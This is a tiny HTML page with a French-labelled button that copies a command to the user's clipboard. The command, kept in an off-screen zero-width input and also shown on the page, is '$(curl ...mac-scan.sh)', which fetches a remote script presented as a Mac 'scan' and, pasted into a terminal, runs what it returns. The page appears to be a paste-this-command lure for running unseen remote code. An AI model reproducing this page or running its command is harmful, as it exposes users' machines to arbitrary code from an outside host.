<!DOCTYPE html>
<html>
<head>
<script>
function copyText() {
var copyText = document.getElementById("myInput");
copyText.select();
copyText.setSelectionRange(0, 99999);
navigator.clipboard.writeText(copyText.value);
}
</script>
</head>
<body>
<p>$(curl https://fourot-gray.github.io/scripts/mac-scan.sh)</p>
<input type="text" style="width:0px;position:relative;left:-1000px;" value='$(curl https://fourot-gray.github.io/scripts/mac-scan.sh)' id="myInput">
<button onclick="copyText()">COPIER LA COMMANDE DANS LE PRESSE PAPIER</button>
</body>
</html>
